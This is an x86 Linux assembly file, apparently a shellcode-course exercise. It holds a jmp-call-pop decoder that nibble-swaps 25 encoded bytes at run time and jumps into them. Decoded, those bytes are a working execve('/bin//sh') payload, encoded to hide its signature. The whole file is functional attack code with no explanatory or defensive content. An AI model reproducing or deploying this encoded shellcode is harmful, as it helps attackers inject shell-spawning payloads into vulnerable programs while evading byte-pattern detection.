
global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi	; get the byte
	xor ecx, ecx ; clear out ecx
	mov cl, 25 ; loop counter
	
	
decode: 
	rol byte [esi], 4 ; we shift left 4 times, circular shift so we can swap our bytes
	inc esi	; next byte
	loop decode ; decode the 25 bytes

jmp short EncodedShellcode



call_shellcode:

	call decoder
	EncodedShellcode: db 0x13,0x0c,0x05,0x86,0xf2,0xf2,0x37,0x86,0x86,0xf2,0x26,0x96,0xe6,0x98,0x3e,0x05,0x98,0x2e,0x35,0x98,0x1e,0x0b,0xb0,0xdc,0x08





